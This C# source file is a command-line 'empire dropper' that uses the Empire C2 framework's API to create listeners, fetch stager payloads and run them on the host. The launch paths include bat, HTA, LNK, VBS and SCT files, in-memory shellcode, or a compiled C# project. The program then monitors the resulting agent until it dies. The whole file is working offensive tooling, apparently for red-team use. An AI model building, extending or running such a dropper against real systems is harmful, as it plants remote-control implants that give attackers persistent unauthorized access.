using System;
using System.Linq;
using System.Collections.Generic;
using System.Timers;
using c2interop;

namespace empire_dropper
{
    class Program
    {
        static EmpireAPI api;
        static void Main(string[] args)
        {
            if (args.Count() == 0){
                showSyntax();
                return;
            }

            api = new EmpireAPI();
            string authToken = api.GetAuthToken();
            Console.WriteLine("[!] Received AuthToken:" + authToken);

            //api.GetAgents();
            //return;
            if (args[0] == "listenertypes"){
                showListenerTypes();
                return;
            }

            if (args[0] == "stagers"){
                showStagers();
                return;
            }

            if (args[0] == "encrypt"){
                Crypter c = new Crypter();
                Console.WriteLine(c.Encrypt(args[1]));
            }

            if (args[0] == "create"){
                //empire-dropper create listenertype listenername stagername option1=option1value option2=option2value
                string listenerType = args[1];
                string listenerName = args[2];
                string stagerName = args[3];
                
                List<string> runCommands = new List<string>();

                Dictionary<string,string> options = new Dictionary<string, string>();
                for (int i = 4; i < args.Length;i++){
                    string[] keyValue = args[i].Split("=");
                    options.Add(keyValue[0],keyValue[1]);
                }

                string defaultPort = "8701";
                if (options.ContainsKey("Port")){
                    defaultPort = options["Port"];
                }

                //Create the listener
                string reply = api.CreateListener(listenerType,listenerName,int.Parse(defaultPort));
                List<stager> stagers = api.GetStagers();
                stager s = stagers.FirstOrDefault(x => x.name == stagerName);
                if (s == null){
                    throw new Exception("Couldn't find a stager by name:" + stagerName);
                }

                //Set stager options from commandline parms
                foreach(string optionName in options.Keys){
                    if (s.options.ContainsKey(optionName)){
                        foreach(option o in s.options.Values){
                            if (o.Name == optionName){
                                o.Value = options[optionName];
                            }
                        }    
                    }
                }

                //Get stager Base64
                s = api.GetListenerStager(listenerName,s);
                if (s.output != null && s.output != ""){
                    if (RunStager(s)){
                        System.Threading.Thread.Sleep(60000);
                        RunWhileAgentIsAlive(listenerName);
                    }
                }
            }
        }

        static void RunWhileAgentIsAlive(string listenerName){
            agent a = GetAgentForListener(listenerName);

            while (IsAgentAlive(a)){
                Console.WriteLine("Agent " + a.name + " is still alive.");                
                System.Threading.Thread.Sleep(60000);
                a = GetAgentForListener(listenerName);
            }

            Console.WriteLine("[!!] Agent for listener " + listenerName + " is dead, exiting.");
        }

        static bool IsAgentAlive(agent a){
            if (a == null || a.stale == "true"){
                return false;
            }
            return true;
        }

        static agent GetAgentForListener(string listenerName){
            List<agent> agents = api.GetAgents();
            return agents.FirstOrDefault(x => x.listener == listenerName);
        }
        static bool RunStager(stager s){
            byte[] stagerBytes = null;
            
            try{
                stagerBytes = Convert.FromBase64String(s.output);            
            }
            catch(Exception e){
                Console.WriteLine(e.Message);
            }

            if (stagerBytes == null || stagerBytes.Length == 0){
                Console.WriteLine("[!!] No payload to execute, quitting.");
                return false;    
            }

            Launcher launcher = new Launcher();
            switch(s.name){
                case "windows/launcher_bat":
                    return launcher.LaunchWindowsProcess("empire-dropper.bat", s);
                    break;
                case "windows/hta":
                    launcher.LaunchHTA("empire-dropper.hta",s);
                    break;
                case "windows/backdoorLnkMacro":
                    launcher.LaunchWindowsLink("empire-dropper.lnk",s);
                    break;
                case "windows/launcher_xml":
                    Console.WriteLine("I don't support XML launchers yet, but here is your payload:");
                    Console.WriteLine(s.output);
                    break;
                case "windows/teensy":
                    Console.WriteLine("I don't support teensy launchers yet, but here is your payload:");
                    Console.WriteLine(s.output);
                    break;
                case "windows/shellcode":
                    launcher.LaunchInMemShellcode(s);
                    break;
                case "windows/macro":
                    Console.WriteLine("I don't support windows macros yet, but here is your payload:");
                    Console.WriteLine(s.output);
                    break;   
                case "windows/bunny":
                    Console.WriteLine("I don't support windows bashbunny yet, but here is your payload:");
                    Console.WriteLine(s.output);                
                    break;  
                case "windows/launcher_vbs":
                    launcher.LaunchVBS("empire-dropper.vbs",s);
                    break;  
                case "windows/dll":
                    Console.WriteLine("I don't support powerpick dlls yet, but here is your payload:");
                    Console.WriteLine(s.output);
                    return false;
                    launcher.LaunchDLL("empire-dropper.dll",s);
                    break;  
                case "windows/launcher_lnk":
                    launcher.LaunchWindowsLink("empire-dropper.lnk",s);
                    break;  
                case "windows/launcher_sct":
                    launcher.LaunchWindowsSCT("empire-dropper.sct",s);
                    break;  
                case "windows/ducky":
                    Console.WriteLine("I don't support ducky launchers yet, but here is your payload:");
                    Console.WriteLine(s.output);                
                    break;  
                case "windows/wmic":
                    Console.WriteLine("I don't support wmic launchers yet, but here is your payload:");
                    Console.WriteLine(s.output);                
                    break;
                case "windows/macroless_msword":
                    Console.WriteLine("I don't support macroless msword launchers yet, but here is your payload:");
                    Console.WriteLine(s.output);                
                    break;
                case "windows/csharp_exe":
                    return launcher.UnZipBuildAndLaunchCSharpProject("dropper.zip",s);
                    //launcher.LaunchWindowsProcess("empire-dropper.exe",s);          
                    break;
                case "multi/launcher":
                case "multi/macro":
                case "multi/bash":
                case "multi/pyinstaller":
                case "multi/war":
                case "osx/launcher":
                case "osx/teensy":
                case "osx/dylib":
                case "osx/shellcode":
                case "osx/macho":
                case "osx/macro":
                case "osx/jar":
                case "osx/applescript":
                case "osx/safari_launcher":
                case "osx/ducky":
                case "osx/application":
                    Console.WriteLine("I don't support OSX/Multi launchers yet, but here is your payload:");
                    Console.WriteLine(s.output);
                    break;
            }

            return true;
        }

        static void showSyntax(){
            Console.WriteLine("empire-dropper stagers - Show all available stagers");
            Console.WriteLine("empire-dropper encrypt texttoencrypt - Encrypt something (Like the Empire API username and password to put inside config.json");
            Console.WriteLine("empire-dropper listenertypes - Show all available listener types");
            Console.WriteLine("empire-dropper create listenertype listenername stagername option1=option1value option2=option2value - Create listener of type listenertype, create a stager using passed options, download stager, invoke stager");           
        }

        static void showListenerTypes(){
            //dbx             http_com        http_hop        http_mapi       onedrive        
            //http            http_foreign    http_malleable  meterpreter     redirector
            string[] listenerTypes = new string[]{
                "dbx",
                "http_com",
                "http_hop",
                "http_mapi",
                "onedrive",
                "http",
                "http_foreign",
                "http_malleable",
                "meterpreter",
                "redirector"
            };

            foreach(string listenerType in listenerTypes){
                Console.WriteLine("[!] " + listenerType);
            }
        }

        static void showStagers(){
            List<stager> stagers = api.GetStagers();
            stagers.ForEach(x => {
                Console.WriteLine("[!] " + x.name);
                foreach (option o in x.options.Values)
                {
                    Console.WriteLine(o.Name + "=" + o.Value + " - Required:" + o.Required);                    
                }
                Console.WriteLine("");
            });
        }
    }
}
